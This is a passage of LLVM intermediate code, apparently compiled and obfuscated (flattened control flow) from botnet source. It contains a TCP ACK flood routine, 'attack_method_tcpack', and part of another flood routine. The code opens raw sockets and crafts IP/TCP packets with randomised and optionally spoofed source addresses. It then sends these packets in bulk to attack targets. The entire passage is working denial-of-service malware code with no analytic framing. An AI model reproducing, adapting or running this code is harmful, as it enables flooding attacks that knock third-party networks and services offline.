  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 1940523376, i32 -44813425
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 -44813425, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 1911679690, i32 1918414825
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 1918414825, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 123752756, i32 205157869
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 205157869, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 1900798109, i32 -1398543524
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 -1398543524, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 268527712, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 441717221, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 -100098870, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -367812233, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -367812233, label %first
    i32 -743837862, label %109
    i32 703027386, label %110
    i32 153933812, label %116
    i32 1666159274, label %119
    i32 1036140210, label %120
    i32 -609129502, label %126
    i32 1685481837, label %174
    i32 770312087, label %178
    i32 754124765, label %273
    i32 -1912250064, label %279
    i32 393965506, label %282
    i32 -2011155217, label %285
    i32 424732474, label %286
    i32 292055867, label %287
    i32 1253436067, label %293
    i32 -189985529, label %316
    i32 -2032215450, label %337
    i32 -1115093946, label %341
    i32 501012062, label %345
    i32 1006651693, label %350
    i32 873436718, label %356
    i32 490539467, label %361
    i32 2100742770, label %367
    i32 1231502745, label %372
    i32 636244020, label %378
    i32 -1313590247, label %382
    i32 -51604194, label %386
    i32 -403050682, label %390
    i32 20353661, label %394
    i32 1356301291, label %398
    i32 -38703794, label %401
    i32 -91142824, label %450
    i32 2093523355, label %453
    i32 -202907217, label %454
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %107 = icmp eq i32 %.reload, -1
  %108 = select i1 %107, i32 -743837862, i32 703027386
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 -202907217, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %111 = load i32, i32* %10, align 4
  %112 = bitcast i32* %9 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 0, i32 3, i8* %112, i32 4) #6
  %114 = icmp eq i32 %113, -1
  %115 = select i1 %114, i32 153933812, i32 1666159274
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  store i32 -202907217, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1036140210, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = select i1 %124, i32 -609129502, i32 -2011155217
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %128 = load i8**, i8*** %11, align 8
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8*, i8** %128, i64 %130
  store i8* %127, i8** %131, align 8
  %132 = load i8**, i8*** %11, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8*, i8** %132, i64 %134
  %136 = load i8*, i8** %135, align 8
  %137 = bitcast i8* %136 to %struct.iphdr*
  store %struct.iphdr* %137, %struct.iphdr** %29, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i64 1
  %140 = bitcast %struct.iphdr* %139 to %struct.tcphdr*
  store %struct.tcphdr* %140, %struct.tcphdr** %30, align 8
  %141 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i64 1
  %143 = bitcast %struct.tcphdr* %142 to i8*
  store i8* %143, i8** %31, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, 15
  %148 = or i8 %147, 64
  store i8 %148, i8* %145, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, -16
  %153 = or i8 %152, 5
  store i8 %153, i8* %150, align 4
  %154 = load i8, i8* %12, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 1
  store i8 %154, i8* %156, align 1
  %157 = load i32, i32* %26, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 40, %158
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  %173 = select i1 %172, i32 1685481837, i32 770312087
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  store i32 770312087, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 6, i8* %180, align 1
  %181 = load i32, i32* %28, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = load i16, i16* %16, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  store i16 %193, i16* %195, align 4
  %196 = load i16, i16* %17, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  %200 = load i32, i32* %18, align 4
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = zext i16 %202 to i32
  %204 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 2
  store i32 %203, i32* %205, align 4
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -241
  %210 = or i16 %209, 80
  store i16 %210, i16* %207, align 4
  %211 = load i8, i8* %20, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 13
  %218 = and i16 %215, -8193
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %21, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 12
  %227 = and i16 %224, -4097
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %22, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 11
  %236 = and i16 %233, -2049
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %23, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 10
  %245 = and i16 %242, -1025
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8, i8* %24, align 1
  %248 = sext i8 %247 to i16
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = and i16 %248, 1
  %253 = shl i16 %252, 9
  %254 = and i16 %251, -513
  %255 = or i16 %254, %253
  store i16 %255, i16* %250, align 4
  %256 = load i8, i8* %25, align 1
  %257 = sext i8 %256 to i16
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %257, 1
  %262 = shl i16 %261, 8
  %263 = and i16 %260, -257
  %264 = or i16 %263, %262
  store i16 %264, i16* %259, align 4
  %265 = call i32 @rand_next()
  %266 = and i32 %265, 65535
  %267 = trunc i32 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 5
  store i16 %267, i16* %269, align 2
  %270 = load i8, i8* %22, align 1
  %271 = icmp ne i8 %270, 0
  %272 = select i1 %271, i32 754124765, i32 -1912250064
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 4
  %276 = load i16, i16* %275, align 4
  %277 = and i16 %276, -2049
  %278 = or i16 %277, 2048
  store i16 %278, i16* %275, align 4
  store i32 -1912250064, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8*, i8** %31, align 8
  %281 = load i32, i32* %26, align 4
  call void @rand_str(i8* %280, i32 %281)
  store i32 393965506, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %9, align 4
  store i32 1036140210, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 424732474, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 292055867, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %9, align 4
  %289 = load i8, i8* %5, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp slt i32 %288, %290
  %292 = select i1 %291, i32 1253436067, i32 2093523355
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8**, i8*** %11, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds i8*, i8** %294, i64 %296
  %298 = load i8*, i8** %297, align 8
  store i8* %298, i8** %32, align 8
  %299 = load i8*, i8** %32, align 8
  %300 = bitcast i8* %299 to %struct.iphdr*
  store %struct.iphdr* %300, %struct.iphdr** %33, align 8
  %301 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i64 1
  %303 = bitcast %struct.iphdr* %302 to %struct.tcphdr*
  store %struct.tcphdr* %303, %struct.tcphdr** %34, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i64 1
  %306 = bitcast %struct.tcphdr* %305 to i8*
  store i8* %306, i8** %35, align 8
  %307 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i64 %309
  %311 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i32 0, i32 2
  %312 = load i8, i8* %311, align 4
  %313 = zext i8 %312 to i32
  %314 = icmp slt i32 %313, 32
  %315 = select i1 %314, i32 -189985529, i32 -2032215450
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %318 = load i32, i32* %9, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 1
  %322 = load i32, i32* %321, align 4
  %323 = call i32 @ntohl(i32 %322) #7
  %324 = call i32 @rand_next()
  %325 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i32 0, i32 2
  %330 = load i8, i8* %329, align 4
  %331 = zext i8 %330 to i32
  %332 = lshr i32 %324, %331
  %333 = add i32 %323, %332
  %334 = call i32 @htonl(i32 %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 9
  store i32 %334, i32* %336, align 4
  store i32 -2032215450, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %28, align 4
  %339 = icmp eq i32 %338, -1
  %340 = select i1 %339, i32 -1115093946, i32 501012062
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 @rand_next()
  %343 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 8
  store i32 %342, i32* %344, align 4
  store i32 501012062, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i16, i16* %13, align 2
  %347 = zext i16 %346 to i32
  %348 = icmp eq i32 %347, 65535
  %349 = select i1 %348, i32 1006651693, i32 873436718
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = call i32 @rand_next()
  %352 = and i32 %351, 65535
  %353 = trunc i32 %352 to i16
  %354 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 3
  store i16 %353, i16* %355, align 4
  store i32 873436718, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i16, i16* %16, align 2
  %358 = zext i16 %357 to i32
  %359 = icmp eq i32 %358, 65535
  %360 = select i1 %359, i32 490539467, i32 2100742770
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 0
  store i16 %364, i16* %366, align 4
  store i32 2100742770, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i16, i16* %17, align 2
  %369 = zext i16 %368 to i32
  %370 = icmp eq i32 %369, 65535
